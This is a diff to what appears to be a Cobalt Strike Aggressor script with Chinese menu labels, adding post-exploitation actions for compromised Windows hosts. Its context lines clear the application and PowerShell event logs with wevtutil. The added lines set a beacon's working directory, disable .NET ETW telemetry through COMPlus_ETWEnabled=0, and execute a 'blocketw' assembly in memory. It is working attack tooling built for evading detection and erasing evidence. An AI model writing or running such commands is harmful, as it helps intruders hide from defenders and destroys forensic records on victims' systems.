@@ -88,7 +88,31 @@ menu "系统操作" {
 			bshell(@ids, "wevtutil cl application");
 			bshell(@ids, "wevtutil cl \"windows powershell\"");
         }, @ids => $1));
-    }	
+    }
+
+				item "设置beacon当前路径" {
+				$bid = $1;
+				$dialog = dialog("设置beacon当前路径", %(Path => "C:\\Windows\\Temp\\", bid => $bid), &beacon_path);
+				drow_text($dialog, "Path",  "设置路径: "); 	
+				dbutton_action($dialog, "设置");
+				dialog_show($dialog);
+        }
+sub beacon_path {
+
+    bcd($bid, $3['Path']);
+    }
+
+menu "隐藏.net行为" {
+				item "cmd命令" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "set COMPlus_ETWEnabled=0");
+			}
+		}
+				item "blocketw" {
+					bexecute_assembly($1, script_resource("/script/blocketw.exe"), "");
+		}
+		}	
 
 
 
